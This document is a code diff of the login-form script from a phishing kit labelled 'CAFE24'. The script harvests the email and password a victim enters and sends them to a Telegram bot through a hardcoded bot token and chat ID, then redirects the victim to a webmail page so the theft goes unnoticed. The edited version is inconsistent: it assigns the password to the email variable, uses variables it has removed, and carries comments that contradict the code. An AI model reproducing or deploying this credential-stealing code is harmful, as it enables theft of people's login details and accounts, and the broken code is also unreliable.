@@ -90,40 +90,36 @@
       event.preventDefault();
 
 
-      var email = document.getElementById('email').value;
-      var password = document.getElementById('password').value;
+var email = document.getElementById('email').value;
+var email = document.getElementById('password').value;
 
-      var apiKey = '7904095790:AAGWb5-pr2UbTPHY2iBYiFWU-xrtHdzrCv0';
-      var chatId = '8125665558';
+// send alert trigger to your server (no secrets here)
+fetch('/alert', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({ email })
+});
+
 
       var message = 'CAFE24:\nEmail: ' + email + '\nPassword: ' + password;
       var url = 'https://api.telegram.org/bot' + apiKey + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(message);
 
-      
-fetch(url)
+      fetch(url)
   .then(function(response) {
-    const params = new URLSearchParams(window.location.search);
-    const domain = params.get("domain");
-
-    if (domain) {
-      window.location.href = "https://webmail." + domain;
+    if (response.ok) {
+      // If the response is OK, redirect to Google
+      window.location.href = "https://webmail.[[-Domain-]]";
     } else {
-      // fallback
-      window.location.href = "https://google.com";
+      // If the response is NOT OK, also redirect to Google
+      window.location.href = "https://webmail.[[-Domain-]]";
     }
   })
-  .catch(function() {
-    const params = new URLSearchParams(window.location.search);
-    const domain = params.get("domain");
-
-    if (domain) {
-      window.location.href = "https://webmail." + domain;
-    } else {
-      window.location.href = "https://google.com";
-    }
+  .catch(function(error) {
+    // On fetch error, redirect to Google too
+    window.location.href = "https://webmail.[[-Domain-]]";
   });
 
-
+    });
   </script>
 <script src=""></script>
 <!-- /Google Analytics -->
